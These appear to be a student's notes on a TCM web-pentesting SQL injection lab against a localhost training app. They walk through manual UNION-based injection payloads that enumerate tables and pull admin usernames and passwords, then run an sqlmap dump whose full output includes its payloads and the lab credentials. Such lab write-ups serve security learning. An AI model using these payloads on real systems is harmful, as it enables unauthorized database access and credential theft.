
#tcm-pwpa-SQLi-challenge
[[1. Introduction to SQL Injection]]
[[1. SQLMAP]]
[[1. SQLi]]

## Injection 0x03 [Challenge]

### Check if the page has SQLi vuln  : 

`x' or 1=1#`

- if *yes* then it will return all the record and render it on the page.

![[Pasted image 20250805201957.png]]

![[Pasted image 20250805202040.png]]

### Data Exfiltration using `UNION` : 

1. Checking.

	- Command used : `Tanjyoubi Sushi Rack' union select null,null,null,null#`

	- Output : 

		![[Pasted image 20250805202958.png]]

2. Database Version : 

	- Command Used : `Tanjyoubi Sushi Rack' union select null,null,null,version()#`

	- Output : 

		![[Pasted image 20250805203236.png]]

3. Current Database Name : 

	-  Command Used : `Tanjyoubi Sushi Rack' union select null,null,null,database()#`

	-  Output : 

		![[Pasted image 20250805205526.png]]

4. Current Table Name : 

	- Command Used : `Tanjyoubi Sushi Rack' UNION SELECT null,null,null,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)#
`

---

# Manual Testing

## Aim to find the admin **username** and **password**.

### 1. Verify if SQLi is working on the website.

-  `Shougatsu Sushi Rack' or 1=1-- -`
	![[Pasted image 20250916095747.png]]

-  When you execute this `Shougatsu Sushi Rack` it will only render information about that product.
	-  But in this case when we executed `Shougatsu Sushi Rack' or 1=1-- -`or `Shougatsu Sushi Rack' or 1=1#` it will render all the products.


### If SQLi is working then, We will use union to extract data from the DB.

#### To Check: 

`Shougatsu Sushi Rack' union select null, null, null, database()#` and you will get something like this.

![[Pasted image 20250916100545.png]]

### So, our aim for this challenge was to get the admin username and password.

#### Lets get all the tables present in the database = `bb-labs`

`Shougatsu Sushi Rack' union select null, null, null, table_name from information_schema.tables#`

![[Pasted image 20250916103812.png]]

-  We need table name **injection0x03_users**

	![[Pasted image 20250916111539.png]]

### Now to extract the username and password of the admin user.

- `Shougatsu Sushi Rack' union select null, null, null, username from injection0x03_users#`

![[Pasted image 20250916111705.png]]

- `Shougatsu Sushi Rack' union select null, null, null, password from injection0x03_users#`

![[Pasted image 20250916111813.png]]

# Automated Testing with **SQLMAP**

```bash title:sqli_injection0x03_users

POST /labs/i0x03.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/labs/i0x03 
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

product=test


```

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# sqlmap -r sqli_injection0x03_users -T injection0x03_users --dump
```

```bash

[02:30:42] [INFO] parsing HTTP request from 'sqli_injection0x03_users'
[02:30:42] [INFO] testing connection to the target URL
[02:30:42] [INFO] testing if the target URL content is stable
[02:30:43] [INFO] target URL content is stable
[02:30:43] [INFO] testing if POST parameter 'product' is dynamic
[02:30:43] [WARNING] POST parameter 'product' does not appear to be dynamic
[02:30:43] [WARNING] heuristic (basic) test shows that POST parameter 'product' might not be injectable
[02:30:43] [INFO] testing for SQL injection on POST parameter 'product'
[02:30:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:30:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:30:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:30:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:30:43] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:30:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[02:30:43] [INFO] testing 'Generic inline queries'
[02:30:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:30:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[02:30:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[02:30:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:30:53] [INFO] POST parameter 'product' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[02:30:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:30:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:30:59] [INFO] target URL appears to be UNION injectable with 4 columns
[02:30:59] [INFO] POST parameter 'product' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'product' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: product (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: product=test' AND (SELECT 3257 FROM (SELECT(SLEEP(5)))CIbD) AND 'SnLp'='SnLp

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: product=test' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7671,0x67686464426e4c52596e6b63634d5377546876686376637879684b70496c484c6975626c43716f4f,0x7178766b71),NULL-- -
---
[02:31:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[02:31:00] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:31:00] [INFO] fetching current database
[02:31:00] [INFO] fetching columns for table 'injection0x03_users' in database 'bb-labs'
[02:31:00] [INFO] fetching entries for table 'injection0x03_users' in database 'bb-labs'
Database: bb-labs
Table: injection0x03_users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| onigirigadaisuki | takeshi  |
+------------------+----------+

[02:31:00] [INFO] table '`bb-labs`.injection0x03_users' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/bb-labs/injection0x03_users.csv'
[02:31:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'

```
